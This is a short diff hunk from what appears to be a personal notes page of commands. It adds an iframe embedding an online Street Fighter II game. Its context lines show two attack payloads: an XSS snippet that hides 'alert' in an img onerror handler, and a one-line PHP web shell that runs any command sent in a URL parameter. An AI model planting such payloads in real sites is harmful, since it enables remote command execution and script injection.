@@ -86,6 +86,10 @@ PAGINA CONTENDO [OUTROS](https://ygoralberto.github.io/outros) COMANDOS DE WINDO
 	<img src="x" onerror="window['aler'+'t']('XSS OnError!')">
 
 .
+ 
+	<iframe src="https://www.retrogames.cc/embed/10030-street-fighter-ii-champion-edition-street-fighter-2-920513-etc.html" width="600" height="450" </iframe>
+
+.
 
 	<?php system($_GET['hacker']);?>
 	
